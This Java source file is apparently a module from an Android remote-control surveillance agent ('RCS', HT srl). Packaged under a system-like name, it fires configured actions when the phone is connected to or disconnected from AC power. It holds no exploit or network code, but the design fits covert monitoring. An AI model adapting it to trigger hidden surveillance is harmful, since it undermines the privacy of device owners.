/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventAc.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.event;

import java.io.IOException;

import android.util.Log;

import com.android.service.Ac;
import com.android.service.auto.Cfg;
import com.android.service.interfaces.Observer;
import com.android.service.listener.ListenerAc;
import com.android.service.util.DataBuffer;

public class EventAc extends EventBase implements Observer<Ac> {
	/** The Constant TAG. */
	private static final String TAG = "EventAc";

	private int actionOnExit, actionOnEnter;
	private boolean inRange = false;
	
	@Override
	public void begin() {
		ListenerAc.self().attach(this);
	}

	@Override
	public void end() {
		ListenerAc.self().detach(this);
	}

	@Override
	public boolean parse(EventConf event) {
		super.setEvent(event);

		final byte[] conf = event.getParams();

		final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length);
		
		try {
			actionOnEnter = event.getAction();
			actionOnExit = databuffer.readInt();
		} catch (final IOException e) {
			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: params FAILED");
			return false;
		}
		
		return true;
	}

	@Override
	public void go() {
		// TODO Auto-generated method stub
	}

	// Viene richiamata dal listener (dalla dispatch())
	public int notification(Ac a) {
		if(Cfg.DEBUG) Log.d("QZ", TAG + " Got power status notification: " + a.getStatus());

		// Nel range
		if (a.getStatus() == true && inRange == false) {
			inRange = true;
			if(Cfg.DEBUG) Log.d("QZ", TAG + " AC IN");
			onEnter();
		} else if (a.getStatus() == false && inRange == true) {
			inRange = false;
			if(Cfg.DEBUG) Log.d("QZ", TAG + " AC OUT");
			onExit();
		}
		
		return 0;
	}
	
	public void onEnter() {
		trigger(actionOnEnter);
	}

	public void onExit() {
		trigger(actionOnExit);
	}
}
